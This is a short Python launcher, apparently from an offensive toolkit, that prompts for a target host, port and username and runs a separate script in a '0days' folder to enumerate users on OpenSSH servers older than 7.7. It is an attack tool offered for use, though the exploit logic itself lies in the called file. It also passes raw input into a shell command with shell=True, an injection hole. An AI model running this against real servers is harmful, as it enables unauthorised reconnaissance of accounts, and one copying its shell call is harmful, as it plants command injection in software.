import subprocess as sub

class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    blue = '\033[34m'
    end = '\033[m'


target = input(f"{Colors.red}(OpenSSH <7.7 User Enumeration){Colors.end} [Enter Target]:~#")
port = int(input(f"{Colors.red}(OpenSSH <7.7 User Enumeration){Colors.end} [Enter Port Number]:~#"))
user = input(f"{Colors.red}(OpenSSH <7.7 User Enumeration){Colors.end} [Enter Username To Check]:~#")

sub.call(f"python ../0days/OpenSSH-7.7-User-Enumeration.py -t {target} -p {port} {user}", shell=True)